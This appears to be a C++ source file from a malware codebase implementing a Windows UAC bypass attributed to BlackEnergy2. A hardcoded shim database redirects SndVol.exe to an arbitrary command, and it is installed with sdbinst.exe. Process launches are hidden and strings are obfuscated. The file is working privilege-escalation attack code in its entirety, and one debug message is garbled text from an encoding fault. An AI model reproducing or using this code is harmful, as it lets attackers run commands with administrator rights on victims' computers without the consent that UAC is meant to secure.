#include "core\winapi.h"
#include "core\elevation.h"
#include "core\memory.h"
#include "core\string.h"
#include "core\file.h"
#include "core\debug.h"
#include "core\misc.h"
#include "core\process.h"

namespace Elevation
{

unsigned char bypassSdb[] =
{
	0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x73, 0x64, 0x62, 0x66, 0x02, 0x78, 0xde, 0x00, 
	0x00, 0x00, 0x03, 0x78, 0x20, 0x00, 0x00, 0x00, 0x02, 0x38, 0x07, 0x70, 0x03, 0x38, 0x01, 0x60, 
	0x16, 0x40, 0x01, 0x00, 0x00, 0x00, 0x01, 0x98, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x2e, 0x01, 0x00, 0x00, 0x03, 0x78, 0x0e, 0x00, 0x00, 0x00, 0x02, 0x38, 
	0x07, 0x70, 0x03, 0x38, 0x0b, 0x60, 0x01, 0x98, 0x00, 0x00, 0x00, 0x00, 0x03, 0x78, 0x0e, 0x00, 
	0x00, 0x00, 0x02, 0x38, 0x07, 0x70, 0x03, 0x38, 0x20, 0x60, 0x01, 0x98, 0x00, 0x00, 0x00, 0x00, 
	0x03, 0x78, 0x0e, 0x00, 0x00, 0x00, 0x02, 0x38, 0x04, 0x70, 0x03, 0x38, 0x01, 0x60, 0x01, 0x98, 
	0x00, 0x00, 0x00, 0x00, 0x03, 0x78, 0x0e, 0x00, 0x00, 0x00, 0x02, 0x38, 0x0d, 0x70, 0x03, 0x38, 
	0x15, 0x40, 0x01, 0x98, 0x00, 0x00, 0x00, 0x00, 0x03, 0x78, 0x14, 0x00, 0x00, 0x00, 0x02, 0x38, 
	0x10, 0x70, 0x03, 0x38, 0x01, 0x60, 0x16, 0x40, 0x01, 0x00, 0x00, 0x00, 0x01, 0x98, 0x00, 0x00, 
	0x00, 0x00, 0x03, 0x78, 0x0e, 0x00, 0x00, 0x00, 0x02, 0x38, 0x12, 0x70, 0x03, 0x38, 0x06, 0x90, 
	0x01, 0x98, 0x00, 0x00, 0x00, 0x00, 0x03, 0x78, 0x14, 0x00, 0x00, 0x00, 0x02, 0x38, 0x12, 0x70, 
	0x03, 0x38, 0x04, 0x90, 0x16, 0x40, 0x01, 0x00, 0x00, 0x00, 0x01, 0x98, 0x00, 0x00, 0x00, 0x00, 
	0x03, 0x78, 0x1a, 0x00, 0x00, 0x00, 0x02, 0x38, 0x07, 0x70, 0x03, 0x38, 0x04, 0x90, 0x01, 0x98, 
	0x0c, 0x00, 0x00, 0x00, 0xbd, 0xeb, 0xaa, 0x24, 0xe2, 0x15, 0x73, 0x72, 0x2e, 0x01, 0x00, 0x00, 
	0x01, 0x70, 0x84, 0x00, 0x00, 0x00, 0x01, 0x50, 0x2e, 0xce, 0x07, 0x7e, 0x7c, 0xf3, 0xcf, 0x01, 
	0x22, 0x60, 0x06, 0x00, 0x00, 0x00, 0x01, 0x60, 0x1c, 0x00, 0x00, 0x00, 0x23, 0x40, 0x01, 0x00, 
	0x00, 0x00, 0x07, 0x90, 0x10, 0x00, 0x00, 0x00, 0xbb, 0x14, 0x5f, 0xeb, 0xf0, 0xf1, 0xc3, 0x42, 
	0x80, 0x42, 0xb3, 0x98, 0x59, 0x70, 0x57, 0x28, 0x02, 0x70, 0x00, 0x00, 0x00, 0x00, 0x07, 0x70, 
	0x46, 0x00, 0x00, 0x00, 0x01, 0x60, 0x2a, 0x00, 0x00, 0x00, 0x06, 0x60, 0x1c, 0x00, 0x00, 0x00, 
	0x05, 0x60, 0xd6, 0x01, 0x00, 0x00, 0x04, 0x90, 0x10, 0x00, 0x00, 0x00, 0x2a, 0xcc, 0x91, 0x4e, 
	0x2f, 0xce, 0x56, 0x4c, 0x97, 0x27, 0x3b, 0x6a, 0xcd, 0xdb, 0x25, 0x3e, 0x08, 0x70, 0x06, 0x00, 
	0x00, 0x00, 0x01, 0x60, 0xf0, 0x01, 0x00, 0x00, 0x09, 0x70, 0x0c, 0x00, 0x00, 0x00, 0x01, 0x60, 
	0xfa, 0x01, 0x00, 0x00, 0x08, 0x60, 0x18, 0x02, 0x00, 0x00, 0x01, 0x78, 0x22, 0x04, 0x00, 0x00, 
	0x01, 0x88, 0x10, 0x00, 0x00, 0x00, 0x32, 0x00, 0x2e, 0x00, 0x31, 0x00, 0x2e, 0x00, 0x30, 0x00, 
	0x2e, 0x00, 0x33, 0x00, 0x00, 0x00, 0x01, 0x88, 0x08, 0x00, 0x00, 0x00, 0x55, 0x00, 0x41, 0x00, 
	0x43, 0x00, 0x00, 0x00, 0x01, 0x88, 0xa6, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x01, 0x88, 0x14, 0x00, 0x00, 0x00, 0x3c, 0x00, 0x55, 0x00, 0x6e, 0x00, 0x6b, 0x00, 0x6e, 0x00, 
	0x6f, 0x00, 0x77, 0x00, 0x6e, 0x00, 0x3e, 0x00, 0x00, 0x00, 0x01, 0x88, 0x04, 0x00, 0x00, 0x00, 
	0x2a, 0x00, 0x00, 0x00, 0x01, 0x88, 0x18, 0x00, 0x00, 0x00, 0x52, 0x00, 0x65, 0x00, 0x64, 0x00, 
	0x69, 0x00, 0x72, 0x00, 0x65, 0x00, 0x63, 0x00, 0x74, 0x00, 0x45, 0x00, 0x58, 0x00, 0x45, 0x00, 
	0x00, 0x00, 0x01, 0x88, 0x0a, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00
};

void GetBypassSbd( Mem::Data& sdb );
static bool RunShellExecuteEx( const char* verb, const char* file, const char* parameters, bool wait = true );

bool BlackEnergy2( const char* cmd, bool wait )
{
	DbgMsg( "UAC BlackEnergy2 %s", cmd );

	Mem::Data sdb;
	GetBypassSbd(sdb);

	char sdbFileName[MAX_PATH];
	File::GetTempFile(sdbFileName);

	StringBuilderStack<16> elevator;
	elevator = _CS_("SndVol.exe");
	for( int i = 0; i < 8; i++ )
		sdb.p_byte()[0x33 - i] = Str::Upper( elevator[i] );
	wchar_t* buf = WStr::Alloc(MAX_PATH + 16);
	int c_buf = Str::ToWideChar( elevator, -1, buf, MAX_PATH + 16 );
	sdb.Copy( 0x1aa, buf, 2 * c_buf );
	c_buf = Str::ToWideChar( cmd, -1, buf, MAX_PATH + 16 );
	sdb.Copy( 0x398, buf, 2 * c_buf );
	WStr::Free(buf);

	File::Write( sdbFileName, sdb );

	StringBuilderStack<32> sdbClean;
	StringBuilderStack<MAX_PATH + 31> sdbInstall, sdbUninstall;
	sdbClean = _CS_("-q -n \"UAC\"");
	sdbInstall.Format( _CS_("-q \"%s\""), sdbFileName );
	sdbUninstall.Format( _CS_("-q -u \"%s\""), sdbFileName );

	bool ret = false;
	if( RunShellExecuteEx( _CS_("runas"), _CS_("sdbinst.exe"), sdbClean ) )
	{
		Delay(500);
		if( RunShellExecuteEx( _CS_("runas"), _CS_("sdbinst.exe"), sdbUninstall ) )
		{
			Delay(500);
			if( RunShellExecuteEx( _CS_("runas"), _CS_("sdbinst.exe"), sdbInstall ) )
			{
				Delay(500);
				if( RunShellExecuteEx( _CS_("runas"), elevator, 0, wait ) )
				{
					Delay(500);
					RunShellExecuteEx( _CS_("runas"), _CS_("sdbinst.exe"), sdbClean );
					RunShellExecuteEx( _CS_("runas"), _CS_("sdbinst.exe"), sdbUninstall );
					DbgMsg( "UAC BlackEnergy2 �������" );
					ret = true;
				}
			}
		}
	}
	File::Delete(sdbFileName);
	return ret;
}

void GetBypassSbd( Mem::Data& sdb )
{
	sdb.Copy( bypassSdb, sizeof(bypassSdb) );
}

bool RunShellExecuteEx( const char* verb, const char* file, const char* parameters, bool wait )
{
	SHELLEXECUTEINFOA info;
	Mem::Zero(info);
	info.cbSize = sizeof(info);
	info.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC | SEE_MASK_WAITFORINPUTIDLE;
	info.lpVerb = verb;
	info.lpFile = file;
	info.lpParameters = parameters;
	info.nShow = SW_HIDE;
	if( API(SHELL32, ShellExecuteExA)(&info) )
	{
		if( wait ) API(KERNEL32, WaitForSingleObject)( info.hProcess, INFINITE );
		return true;
	}
	return false;
}

}